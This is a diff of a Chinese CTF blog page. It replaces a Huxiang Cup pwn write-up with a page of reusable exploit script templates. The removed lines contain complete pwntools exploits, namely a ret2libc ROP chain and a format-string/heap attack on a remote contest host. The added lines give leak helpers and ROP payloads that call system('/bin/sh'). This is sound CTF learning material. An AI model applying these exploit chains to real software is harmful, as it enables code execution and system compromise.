@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="湖湘杯wp-pwn, Tower">
+    <meta name="keywords" content="ctf脚本技巧, Tower">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>湖湘杯wp-pwn | Tower</title>
+    <title>ctf脚本技巧 | Tower</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">湖湘杯wp-pwn</h1>
+                    <h1 class="description center-align post-title">ctf脚本技巧</h1>
                 </div>
             </div>
         </div>
@@ -434,8 +434,12 @@
                                 <span class="chip bg-color">ctf</span>
                             </a>
                         
-                            <a href="/tags/wp/">
-                                <span class="chip bg-color">wp</span>
+                            <a href="/tags/%E6%8A%80%E5%B7%A7/">
+                                <span class="chip bg-color">技巧</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%A8%A1%E6%9D%BF/">
+                                <span class="chip bg-color">模板</span>
                             </a>
                         
                     </div>
@@ -450,7 +454,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-10
+                    1970-01-01
                 </div>
                 
 
@@ -464,14 +468,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    810
+                    612
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    2 分
                 </div>
                 
 
@@ -486,88 +490,11 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="pwn1-what-the-f-k-printf"><a href="#pwn1-what-the-f-k-printf" class="headerlink" title="pwn1 what the f**k printf?"></a>pwn1 what the f**k printf?</h2><p>输入16个32能够溢出</p>
-<p>泄露libc   获取shell</p>
-<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-
-
-local<span class="token operator">=</span><span class="token number">1</span>
-pop_rdi_ret<span class="token operator">=</span><span class="token number">0x0000000000401213</span>
-valu_addr<span class="token operator">=</span><span class="token number">0x000000000401181</span>
-
-<span class="token keyword">if</span> local<span class="token punctuation">:</span>
-    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
-
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
-<span class="token comment" spellcheck="true"># pop= int(enhex(asm("pop rdi;ret")),16)</span>
-<span class="token comment" spellcheck="true"># print</span>
-
-
-p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn_printf"</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You will find this game very interesting\n"</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true"># print(pop)</span>
-
-
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">50015</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">for</span> item <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"32"</span><span class="token punctuation">)</span>
-
-elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./pwn_printf"</span><span class="token punctuation">)</span>
-
-
-<span class="token comment" spellcheck="true"># gdb.attach(p,"b *0x0000000000401181")</span>
-
-payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>valu_addr<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-libc_info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">"\x00\x00"</span>
-libc_info<span class="token operator">=</span>u64<span class="token punctuation">(</span>libc_info<span class="token punctuation">)</span>
-
-
-libc<span class="token punctuation">.</span>address<span class="token operator">=</span>libc_info<span class="token number">-0x6f6a0</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_info<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-
-payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#1.直接用call函数不是更好?为什么在call完之后调用</span>
-</code></pre>
-<p>遇到问题:</p>
-<ul>
-<li>原来使用Ubuntu18的环境运行,在第二次拿shell的时候总是失败</li>
-<li>偏移用libc_search搜索出来的,但是还是不准.</li>
-<li>在第二次拿shell的时候可以跳过call,上面的脚本运行了call指令,实际上最好是不用call指令,用了call指令在Ubuntu18环境里可能会出问题,具体原因不知道.</li>
-</ul>
-<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><ul>
-<li>在read的时候有off-by-one</li>
-<li>在show_name的时候有格式化字符串漏洞</li>
-<li>free之后指针没有清零,有doublefree</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604996256058.png" alt="try-catch过程"></p>
-<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604996932067.png" alt="函数实现"></p>
-<p>unwind过程完成之后将会运行到程序的空间由用户定义的catch函数进行接下来的操作(注意:在catch之前不能修改返回地址可能会跳不到catch函数),整个过程跳过了canary检测</p>
-<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604999037533.png" alt="catch函数"></p>
-<p>直接进行了leave,ret跳过了canary的检测</p>
-<p>leave指令进行了</p>
-<pre class=" language-c"><code class="language-c">mov esp<span class="token punctuation">,</span>ebp<span class="token punctuation">;</span>  恢复esp同时回收局部变量空间
-pop ebp<span class="token punctuation">;</span>          从栈中恢复保存的ebp的值</code></pre>
-<p>再次执行leave,ret指令的时候程序会跳转到ebp+4存放的地址将会是返回地址。</p>
-<p>这里在堆上布置好rop</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-file_path <span class="token operator">=</span> <span class="token string">"./blend_pwn"</span>
+                <h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="脚本的开始"><a href="#脚本的开始" class="headerlink" title="脚本的开始"></a>脚本的开始</h3><pre class=" language-python"><code class="language-python">file_path <span class="token operator">=</span> <span class="token string">"./blend_pwn"</span>
 context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
 context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
 <span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>
 elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
-
-
-
 
 debug <span class="token operator">=</span> <span class="token number">1</span>
 <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
@@ -580,9 +507,9 @@ debug <span class="token operator">=</span> <span class="token number">1</span>
     p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>
     libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
     one_gadget <span class="token operator">=</span> <span class="token number">0x0</span>
-<span class="token comment" spellcheck="true"># p=process("./blend_pwn")</span>
-
-<span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+</code></pre>
+<h2 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h2><h3 id="用来调试开启PIE的程序"><a href="#用来调试开启PIE的程序" class="headerlink" title="用来调试开启PIE的程序"></a>用来调试开启PIE的程序</h3><p>能得到pie的地址运行一些gdb命令</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
     debug_str <span class="token operator">=</span> <span class="token string">""</span>
     <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>
         text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> 
@@ -594,88 +521,49 @@ debug <span class="token operator">=</span> <span class="token number">1</span>
             debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
         gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span> 
 
-<span class="token keyword">def</span> <span class="token function">leak_result</span><span class="token punctuation">(</span>until<span class="token punctuation">)</span><span class="token punctuation">:</span>
+debug_1<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x000000000000117C</span><span class="token punctuation">,</span><span class="token number">0x00000000000011B8</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
+<h2 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h2><h3 id="用来泄露堆里面的地址-待改进为可以泄露两个"><a href="#用来泄露堆里面的地址-待改进为可以泄露两个" class="headerlink" title="用来泄露堆里面的地址(待改进为可以泄露两个)"></a>用来泄露堆里面的地址(待改进为可以泄露两个)</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak_result</span><span class="token punctuation">(</span>until<span class="token punctuation">)</span><span class="token punctuation">:</span>
     p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>until<span class="token punctuation">)</span>
     info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>
     result<span class="token operator">=</span>u64<span class="token punctuation">(</span>info<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak_result  content address: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token keyword">return</span> result
 
-
-<span class="token keyword">def</span> <span class="token function">send_name</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-
-
-<span class="token keyword">def</span> <span class="token function">show_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">new_node</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input note:\n"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">delete_node</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index>"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">show_node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"666"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" want:"</span><span class="token punctuation">)</span>
-    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-
-
-
-<span class="token keyword">def</span> <span class="token function">get_formate_result</span><span class="token punctuation">(</span>until<span class="token operator">=</span><span class="token string">"0x"</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    info<span class="token operator">=</span>info<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
-    info<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>length<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> info<span class="token punctuation">]</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak info (may set a and b to get real info) : "</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> info
-<span class="token keyword">def</span> <span class="token function">get_int</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    content<span class="token operator">=</span><span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>
-    out<span class="token operator">=</span><span class="token punctuation">[</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"content to int end is : "</span><span class="token punctuation">,</span>out<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> content
-
-
-
-send_name<span class="token punctuation">(</span><span class="token string">"%p-%p"</span><span class="token punctuation">)</span>
-
-show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
-info<span class="token operator">=</span>get_formate_result<span class="token punctuation">(</span><span class="token punctuation">)</span>
-info<span class="token operator">=</span>get_int<span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-libc<span class="token punctuation">.</span>address<span class="token operator">=</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x3c6780</span>
-pop_rdi_ret<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x0000000000021112</span>
-payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>
-
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input note:\n"</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-new_node<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-
+new_node<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x61</span><span class="token punctuation">)</span>
+new_node<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x61</span><span class="token punctuation">)</span>
 
 delete_node<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 delete_node<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
 show_node<span class="token punctuation">(</span><span class="token punctuation">)</span>
-heap_addr<span class="token operator">=</span>leak_result<span class="token punctuation">(</span><span class="token string">"index 1:"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x20</span>
-<span class="token comment" spellcheck="true"># gift("a"+"\n")</span>
+leak_result<span class="token punctuation">(</span><span class="token string">"index 1:"</span><span class="token punctuation">)</span></code></pre>
+<h3 id="泄露格式化字符串-可以同时泄露多个-因为里面直接用recv-会一下接收全部的回应可能会让下一次new阻塞"><a href="#泄露格式化字符串-可以同时泄露多个-因为里面直接用recv-会一下接收全部的回应可能会让下一次new阻塞" class="headerlink" title="泄露格式化字符串(可以同时泄露多个),因为里面直接用recv()会一下接收全部的回应可能会让下一次new阻塞"></a>泄露格式化字符串(可以同时泄露多个),因为里面直接用recv()会一下接收全部的回应可能会让下一次new阻塞</h3><p>输入的payload为%p%p格式</p>
+<ul>
+<li>spli为要进行切割的字符串</li>
+<li>length为要每一段要保留的长度(如果是libc的地址6个字节,需要的长度为12)</li>
+<li>需要先查看输出再决定保留哪一部分<pre class=" language-python"><code class="language-python"></code></pre>
+</li>
+</ul>
+<h1 id="列表字符串转int-包含一个输出"><a href="#列表字符串转int-包含一个输出" class="headerlink" title="列表字符串转int,包含一个输出"></a>列表字符串转int,包含一个输出</h1><p>def get_int(content):<br>    content=[int(i,16) for i in content]<br>    out=[hex(i) for i in content]<br>    print(“content to int end is : “,out)<br>    return content</p>
+<p>def get_formate_result(spli=”0x”,length=12):<br>    info=p.recv()<br>    info=info.split(spli)<br>    info=[i[0:length] for i in info]<br>    print(“leak info (may set a and b to get real info) : “,info)<br>    return info</p>
+<p>send_name(“%p-%p”)#中间长度不够12的元素将会被舍弃<br>show_name()<br>info=get_formate_result()<br>info=get_int(info[1:])</p>
+<p>输出结果为<br>(‘leak info (may set a and b to get real info) : ‘, [‘Current user’, ‘7ffc95a046f0’, ‘7f409df8a780’])<br>(‘content to int end is : ‘, [‘0x7ffc95a046f0’, ‘0x7f409df8a780’])</p>
+<pre><code>## 常用payload
+### 常用rop(待添加如ret2dl的,栈迁移的等)
 
-<span class="token comment" spellcheck="true">#debug_1([0x00000000000012C2,0x0000000000011B8])</span>
-gift<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xa9"</span><span class="token punctuation">)</span>
-
-
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
+#### 泄露puts函数got表
+``` python
+p64(pop_rdi_ret)+p64(elf.got[&quot;puts&quot;])+p64(elf.plt[&quot;puts&quot;])+p64(下一次返回的地址)</code></pre>
+<h4 id="调用system-“-bin-sh”"><a href="#调用system-“-bin-sh”" class="headerlink" title="调用system(“/bin/sh”)"></a>调用system(“/bin/sh”)</h4><pre class=" language-python"><code class="language-python">p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
+<h2 id="计算方法"><a href="#计算方法" class="headerlink" title="计算方法"></a>计算方法</h2><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>泄露-目的=偏移——&gt;目的=泄露-偏移<br>例:</p>
+<pre class=" language-python"><code class="language-python">泄露libc地址<span class="token operator">-</span>vmmap得出来的libc基地址
+<span class="token operator">>></span><span class="token operator">></span> hex<span class="token punctuation">(</span><span class="token number">0x7f5f30f3d780</span><span class="token operator">-</span><span class="token number">0x7f5f30b77000</span><span class="token punctuation">)</span>
+<span class="token string">'0x3c6780'</span>
+写在脚本里的是
+libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token number">-0x3c6780</span></code></pre>
+<p>libc上的地址也可以直接用vmmap 得出,但是栈的地址只能用上面的方法计算出来</p>
+<pre class=" language-python"><code class="language-python">pwndbg<span class="token operator">></span> vmmap <span class="token number">0x7f5f3086e000</span><span class="token operator">+</span><span class="token number">0x50</span>
+LEGEND<span class="token punctuation">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
+    <span class="token number">0x7f5f3086e000</span>     <span class="token number">0x7f5f30976000</span> r<span class="token operator">-</span>xp   <span class="token number">108000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libm<span class="token number">-2.23</span><span class="token punctuation">.</span>so <span class="token operator">+</span><span class="token number">0x50</span></code></pre>
 
             </div>
             <hr/>
@@ -693,8 +581,12 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                                     <span class="chip bg-color">ctf</span>
                                 </a>
                             
-                                <a href="/tags/wp/">
-                                    <span class="chip bg-color">wp</span>
+                                <a href="/tags/%E6%8A%80%E5%B7%A7/">
+                                    <span class="chip bg-color">技巧</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%A8%A1%E6%9D%BF/">
+                                    <span class="chip bg-color">模板</span>
                                 </a>
                             
                         </div>
@@ -739,7 +631,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         repo: '',
         owner: '',
         admin: null,
-        id: '2020-11-10T20-45-06',
+        id: '1970-01-01T08-00-00',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -767,24 +659,27 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/11/10/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/">
+                <a href="/2020/11/10/%E6%B9%96%E6%B9%98%E6%9D%AFpwn-wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="湖湘杯wp-pwn">
                         
-                        <span class="card-title">2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</span>
+                        <span class="card-title">湖湘杯wp-pwn</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            pwn2自己只做了pwn2，就从pwn2开始
-c++用于输入输出,主要逻辑是用c实现的。因为会调用c++的库，这里涉及到一些库的库的加载。
-漏洞分析
-当进行add的时候如果size为0将会成功申请空间
+                            pwn1 what the f**k printf?输入16个32能够溢出
+泄露libc   获取shell
+#coding=utf-8
+from pwn import *
 
-在edit的时候如果size为0可以
+
+
+local=1
+pop_rdi_ret=0x00000000
                         
                     </div>
                     <div class="publish-info">
@@ -818,7 +713,7 @@ c++用于输入输出,主要逻辑是用c实现的。因为会调用c++的库，
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
                 <a href="/1970/01/01/pwn%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7%E6%A8%A1%E6%9D%BF/">
@@ -851,6 +746,7 @@ context.log_level = "debug"
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
